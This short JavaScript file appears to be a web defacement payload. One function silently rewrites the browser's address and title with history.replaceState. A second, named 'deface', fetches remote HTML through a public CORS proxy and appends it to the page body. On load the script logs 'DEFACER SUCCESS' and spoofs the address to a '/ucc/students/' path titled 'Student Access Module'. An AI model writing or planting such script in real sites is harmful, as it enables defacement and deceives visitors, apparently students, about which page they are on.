function changeURL(newUrl, title = '') {
    // Replace the current URL and history entry without adding a value
    history.replaceState(null, title, newUrl);

    // Optionally update the page title
    if (title) {
        document.title = title;
    }

    console.log(`URL replaced with: ${newUrl}`);
}

function deface(url) {
    const corsProxyUrl = 'https://corsproxy.io/?url=';

    // Fetch the content using the CORS proxy
    fetch(corsProxyUrl + url)
      .then(response => response.text()) // Get the response as text (HTML content)
      .then(data => {
        // Create a temporary DOM element to parse the HTML
        const parser = new DOMParser();
        const doc = parser.parseFromString(data, 'text/html');

        // Get the body content
        const bodyContent = doc.body.innerHTML;

        // Append the body content to the current page's body
        document.body.innerHTML += bodyContent;
      })
      .catch(error => console.error('Error:', error));
}

console.log("DEFACER SUCCESS");
changeURL('/ucc/students/', 'Student Access Module');
